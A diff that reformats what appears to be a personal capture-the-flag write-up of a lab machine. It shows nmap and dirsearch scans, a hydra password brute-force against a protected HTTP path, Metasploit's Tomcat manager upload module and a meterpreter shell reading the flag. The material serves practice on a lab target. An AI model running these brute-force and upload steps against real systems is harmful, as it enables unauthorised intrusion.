@@ -1,3 +1,4 @@
+```bash
 ─(kali㉿kali)-[~]
 └─$ nmap 10.10.91.140
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-11 16:48 EDT
@@ -38,7 +39,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 35.07 seconds
-
+```
 
 ajp13  ??? msfconsole
 
@@ -46,7 +47,7 @@ ajp13  ??? msfconsole
 
 dirsearch showed not much , used bigger list ,, 
 
-                                                                                                                                                                         
+```bash 
 ┌──(kali㉿kali)-[~/dirsearch]
 └─$ python3 dirsearch.py -u http://10.10.91.140 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 /home/kali/dirsearch/thirdparty/requests/__init__.py:91: RequestsDependencyWarning: urllib3 (1.26.2) or chardet (4.0.0) doesn't match a supported version!
@@ -69,7 +70,7 @@ Output File: /home/kali/dirsearch/reports/10.10.91.140/_21-05-11_16-53-58.txt
 [17:03:23] 403 -  300B  - /server-status
 
 Task Completed
-
+```
 
 /guidelines
 
@@ -83,7 +84,7 @@ went to write up
 https://github.com/DarkStar7471/CTF-ToolsRus
 
 
-                                                                            
+```bash                                                                             
 ┌──(kali㉿kali)-[~]
 └─$ hydra -l bob -P /usr/share/wordlists/rockyou.txt -t 1 -f 10.10.91.140 http-get /protected/
 Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -96,15 +97,11 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-05-11 17:59:
 [STATUS] attack finished for 10.10.91.140 (valid pair found)
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-05-11 18:00:45
+```
 
 
-
-
-
-
-
-msf
-
+### msf
+```bash
 msf6 > search tomcat_mgr_upload
 
 Matching Modules
@@ -232,4 +229,4 @@ Mode              Size  Type  Last modified              Name
 meterpreter > cat flag.txt
 ff1fc4a81affcc7688cf89ae7dc6e0e1
 meterpreter > 
-
+```
